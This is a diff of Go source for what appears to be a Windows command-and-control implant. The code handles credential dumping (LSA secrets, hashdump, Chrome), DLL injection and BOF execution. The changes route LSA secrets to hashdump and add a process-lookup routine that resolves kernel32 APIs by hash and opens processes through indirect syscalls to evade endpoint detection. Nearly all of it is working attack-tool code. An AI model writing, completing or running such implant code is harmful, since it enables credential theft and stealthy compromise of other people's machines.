@@ -4,7 +4,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"path/filepath"
 	"strings"
 	"time"
 	"unsafe"
@@ -291,37 +290,8 @@ func handleChrome(task *proto.Task) *proto.TaskResult {
 }
 
 func handleLSASecrets(task *proto.Task) *proto.TaskResult {
-	result, err := creds.DumpHashes()
-	if err != nil {
-		return fail(task, err.Error())
-	}
-	var sb strings.Builder
-
-	if len(result.LSASecrets) == 0 {
-		return success(task, []byte("no LSA secrets found"))
-	}
-
-	sb.WriteString("=== LSA Secrets ===\n")
-	for _, secret := range result.LSASecrets {
-		sb.WriteString(fmt.Sprintf("[%s] %s\n", secret.Type, secret.Name))
-		if secret.Password != "" {
-			sb.WriteString(fmt.Sprintf("  Password: %s\n", secret.Password))
-		}
-		if len(secret.NTHash) > 0 {
-			sb.WriteString(fmt.Sprintf("  NTHash: %x\n", secret.NTHash))
-		}
-		if len(secret.MachineKey) > 0 {
-			sb.WriteString(fmt.Sprintf("  MachineKey: %x\n", secret.MachineKey))
-		}
-		if len(secret.UserKey) > 0 {
-			sb.WriteString(fmt.Sprintf("  UserKey: %x\n", secret.UserKey))
-		}
-		if secret.MatchedUser != "" {
-			sb.WriteString(fmt.Sprintf("  MatchedUser: %s\n", secret.MatchedUser))
-		}
-	}
-
-	return success(task, []byte(sb.String()))
+	// LSA secrets are included in hashdump output - this is a convenience alias
+	return handleHashdump(task)
 }
 
 func handleUnhook(task *proto.Task) *proto.TaskResult {
@@ -472,7 +442,6 @@ func handleInjectDLL(task *proto.Task) *proto.TaskResult {
 }
 
 func openProcess(pid uint32) (uintptr, error) {
-	ntdll := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
 	openProc := wc.GetSyscall(wc.GetHash("NtOpenProcess"))
 
 	type clientID struct {
@@ -493,7 +462,7 @@ func openProcess(pid uint32) (uintptr, error) {
 	oa.Length = uint32(unsafe.Sizeof(oa))
 	cid := clientID{pid: uintptr(pid)}
 
-	access := uintptr(0x001F0FFF)
+	access := uintptr(0x001F0FFF) // PROCESS_ALL_ACCESS
 	ret, _ := wc.IndirectSyscall(openProc.SSN, openProc.Address,
 		uintptr(unsafe.Pointer(&hProcess)),
 		access,
@@ -503,7 +472,6 @@ func openProcess(pid uint32) (uintptr, error) {
 	if ret != 0 {
 		return 0, fmt.Errorf("NtOpenProcess failed: 0x%x", ret)
 	}
-	_ = ntdll
 	return hProcess, nil
 }
 
@@ -513,8 +481,55 @@ func closeHandle(h uintptr) {
 }
 
 func findProcess(name string) (uint32, error) {
+	k32 := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
+	createSnapshot := wc.GetFunctionAddress(k32, wc.GetHash("CreateToolhelp32Snapshot"))
+	process32First := wc.GetFunctionAddress(k32, wc.GetHash("Process32FirstW"))
+	process32Next := wc.GetFunctionAddress(k32, wc.GetHash("Process32NextW"))
+	closeHandle := wc.GetFunctionAddress(k32, wc.GetHash("CloseHandle"))
 
-	return 0, fmt.Errorf("not implemented")
+	const TH32CS_SNAPPROCESS = 0x00000002
+
+	type processEntry32 struct {
+		dwSize              uint32
+		cntUsage            uint32
+		th32ProcessID       uint32
+		th32DefaultHeapID   uintptr
+		th32ModuleID        uint32
+		cntThreads          uint32
+		th32ParentProcessID uint32
+		pcPriClassBase      int32
+		dwFlags             uint32
+		szExeFile           [260]uint16
+	}
+
+	snap, _, _ := wc.CallG0(createSnapshot, TH32CS_SNAPPROCESS, 0)
+	if snap == 0 || snap == ^uintptr(0) {
+		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed")
+	}
+	defer wc.CallG0(closeHandle, snap)
+
+	var pe processEntry32
+	pe.dwSize = uint32(unsafe.Sizeof(pe))
+
+	ret, _, _ := wc.CallG0(process32First, snap, uintptr(unsafe.Pointer(&pe)))
+	if ret == 0 {
+		return 0, fmt.Errorf("Process32First failed")
+	}
+
+	targetLower := strings.ToLower(name)
+	for {
+		exeName := wc.UTF16ToString(&pe.szExeFile[0])
+		if strings.ToLower(exeName) == targetLower {
+			return pe.th32ProcessID, nil
+		}
+
+		ret, _, _ = wc.CallG0(process32Next, snap, uintptr(unsafe.Pointer(&pe)))
+		if ret == 0 {
+			break
+		}
+	}
+
+	return 0, fmt.Errorf("process '%s' not found", name)
 }
 
 func handleBOF(task *proto.Task) *proto.TaskResult {
@@ -567,5 +582,4 @@ func packBOFArgsFromStrings(args []string) []byte {
 	return packed
 }
 
-var _ = filepath.Base
 
